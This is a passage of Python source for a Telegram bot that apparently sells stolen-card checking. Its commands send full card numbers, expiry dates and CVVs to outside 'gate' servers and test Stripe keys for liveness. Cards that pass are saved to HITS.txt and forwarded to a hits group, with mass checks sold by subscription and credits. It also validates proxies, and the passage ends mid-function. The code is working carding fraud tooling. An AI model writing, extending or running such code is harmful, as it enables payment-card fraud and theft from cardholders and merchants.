    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.\nSend @spydil the group username and chat ID to get approved.")
        return

    proxies_text = message.text.split('\n')[1:]
    if not proxies_text:
        bot.reply_to(message, "❌ Please send proxies after the command.\nExample:\n/prochk\n1.1.1.1:8080\n8.8.8.8:3128")
        return

    live = []
    dead = []

    status_msg = bot.reply_to(message, "🔍 Checking proxies...\n✅ Live: 0\n❌ Dead: 0\n⏳ Progress: 0/{}".format(len(proxies_text)))

    for idx, proxy in enumerate(proxies_text, start=1):
        proxy = proxy.strip()
        if not proxy:
            continue

        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        try:
            r = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=5)
            if r.status_code == 200:
                live.append(proxy)

                ip, port = proxy.split(':')
                bot.send_message(
                    message.chat.id,
                    f"""┏━━━━━━━⍟
┃ LIVE PROXY ✅ 
┗━━━━━━━━━━━⊛

❖ 𝗩𝗔𝗟𝗜𝗗: ✅
❖ IP   : <code>{ip}</code>
❖ PORT  : <code>{port}</code>
""",
                    parse_mode="HTML"
                )
            else:
                dead.append(proxy)
        except:
            dead.append(proxy)

        # Live edit progress message
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"""🔍 Checking proxies...
✅ Live: {len(live)}
❌ Dead: {len(dead)}
⏳ Progress: {idx}/{len(proxies_text)}
""")
        except:
            pass

    # Final summary
    final_text = "🧹 <b>Proxy Check Finished</b>\n\n"
    if live:
        final_text += "✅ <b>Live Proxies:</b>\n" + "\n".join(live) + "\n\n"
    if dead:
        final_text += "❌ <b>Dead Proxies:</b>\n" + "\n".join(dead)

    bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=final_text.strip(), parse_mode="HTML")


@bot.message_handler(commands=['pk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.pk'))
def handle_pk_check(message):
    # Restrict in DMs and unapproved groups
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Flood control
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /pk <pk_key>")
            return
        pk_key = parts[1]

        status_msg = bot.reply_to(message, "🔍 Checking PK key...")

        def check_pk():
            try:
                headers = {
                    "Authorization": f"{pk_key}",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = "type=card&card[number]=4242424242424242&card[exp_month]=12&card[exp_year]=2030&card[cvc]=123"
                r = requests.post("https://api.stripe.com/v1/tokens", headers={"Authorization": f"Bearer {pk_key}"}, data=data, timeout=20)

                if r.status_code == 200 and "id" in r.json():
                    token_id = r.json().get("id")
                    msg = f"""
┏━━━━━━━⍟
┃ PK Key Info
┗━━━━━━━━━━━⊛

✧ Token       : <code>{token_id}</code>
✧ Type        : <code>Publishable Key</code>
✧ Key Status  : <b>✅ LIVE</b>
✧ Checked Key : <code>{pk_key}</code>
"""
                elif r.status_code == 401:
                    msg = f"""
┏━━━━━━━⍟
┃ PK Key Info
┗━━━━━━━━━━━⊛

✧ Status      : <b>❌ DEAD / INVALID</b>
✧ Checked Key : <code>{pk_key}</code>
"""
                else:
                    msg = f"""
┏━━━━━━━⍟
┃ PK Key Info
┗━━━━━━━━━━━⊛

✧ Status      : ⚠️ UNKNOWN ({r.status_code})
✧ Checked Key : <code>{pk_key}</code>
"""

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=msg.strip(),
                                      parse_mode="HTML")
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ Error checking key: <code>{str(e)}</code>",
                                      parse_mode="HTML")

        threading.Thread(target=check_pk).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Your weather API key
api_key = '907913fb77176b0f27ebfbcf123e588f'

# Optional log function (prevent crash)
def log_bot_activity(message):
    print(f"[LOG] {message.chat.id} used command: {message.text}")

api_key = '907913fb77176b0f27ebfbcf123e588f'

def log_bot_activity(message):
    print(f"[LOG] {message.chat.id} used command: {message.text}")

# /wh command (public + private)
@bot.message_handler(commands=['wh'])
def handle_weather_command(message):
    try:
        city = message.text.split(' ', 1)[1]
    except IndexError:
        bot.reply_to(message, "❗ Please enter a city name.\nExample: `/wh London`", parse_mode="Markdown")
        return

    send_weather(message, city)

# .wh command (DM only)
@bot.message_handler(func=lambda message: message.text and message.text.lower().startswith('.wh'))
def handle_weather_dm(message):
    if message.chat.type != 'private':
        return
    try:
        city = message.text.split(' ', 1)[1]
    except IndexError:
        bot.reply_to(message, "❗ Please enter a city name.\nExample: `.wh London`", parse_mode="Markdown")
        return

    send_weather(message, city)

# Common weather function
def send_weather(message, city):
    url = f"http://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}&units=metric"
    r = requests.get(url)
    if r.status_code == 200:
        data = r.json()
        main = data['main']
        weather = data['weather'][0]
        wind = data['wind']
        city_name = data['name']
        country = data['sys']['country']

        reply = (
            "┏━━━━━━━⍟\n"
            "┃ Weather Info\n"
            "┗━━━━━━━━━━━⊛\n\n"
            f"✧ City        : <code>{city_name}, {country}</code>\n"
            f"✧ Temperature : <code>{main['temp']}°C</code>\n"
            f"✧ Weather     : <code>{weather['description'].capitalize()}</code>\n"
            f"✧ Humidity    : <code>{main['humidity']}%</code>\n"
            f"✧ Wind Speed  : <code>{wind['speed']} m/s</code>"
        )
        bot.reply_to(message, reply, parse_mode="HTML")
    else:
        bot.reply_to(message, "❗ City not found or API error.", parse_mode="Markdown")

    log_bot_activity(message)

def check_premium_auth_cc(cc):
    try:
        # Normalize input (same as before)
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Premium Auth'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback (same as before)
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup (same as before)
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request to Premium Auth endpoint
        try:
            response = requests.get(
                f"https://sp-app-gz2b.onrender.com/gate=sp/key=voidboy/cc={formatted_cc}",
                timeout=300
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                    
                    # Special handling for Premium Auth response
                    if 'result' in data:
                        try:
                            result_data = json.loads(data['result'])
                            if isinstance(result_data, list) and len(result_data) > 0:
                                if result_data[0].get('data', {}).get('ecommerceStoreStripePaymentMethod', {}).get('ok', False):
                                    status = 'APPROVED'
                        except:
                            pass
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe + Paypal [0.5$]'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe + Paypal [0.5$]'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe + Paypal [0.5$]'
        }
    
# Handle both /ax and .ax (Free Users Version)
@bot.message_handler(commands=['ax'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ax'))
def handle_ax_free(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /ax CC|MM|YYYY|CVV or .ax CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".ax "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe + Paypal [0.5$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), parse_mode='HTML')

        def check_card():
            try:
                result = check_premium_auth_cc(cc)
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /max and .max (mass check)
@bot.message_handler(commands=['max'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.max'))
def handle_max(message):
    # Check if user is subscribed (Premium Auth is only for subscribed users)
    if not is_user_subscribed(message.from_user.id) and str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Premium Auth is only available for subscribed users.")
        return
        
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return

    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_premium_auth_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe + Paypal [1$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_sx_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [1$]'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"https://sx-d7or.onrender.com/gate=sx/key=voidboy/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe [1$]'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe [1$]'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe [1$]'
        }

@bot.message_handler(commands=['sx'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sx'))
def handle_sx(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.Send Username & Chat Id of this Group Here @spydil To get approved")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sx CC|MM|YYYY|CVV or .sx CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[3:].strip()  # remove ".sx "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        # Fixed format string - properly escape curly braces
        status_msg = bot.reply_to(message, 
            "↯ Checking..\n\n"
            "⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n"
            "⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>Stripe [1$]</i>\n"
            "⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), 
            parse_mode='HTML')

        def check_card():
            try:
                result = check_sx_cc(cc)
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mchk and .mchk
# Handle both /msx and .msx (Subscribers Only)
@bot.message_handler(commands=['msx'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msx'))
def handle_msx_sub_only(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed (added this restriction)
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Use the higher limit for subscribed users
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_sx_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe [1$]'  # Changed to Stripe Auth
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}",
                                    parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_b4_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(B4_API_URL.format(formatted_cc), headers=headers, timeout=200)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                    
                status = data.get('status', '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱')
                message = data.get('response', 'Declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success' , '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error' '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
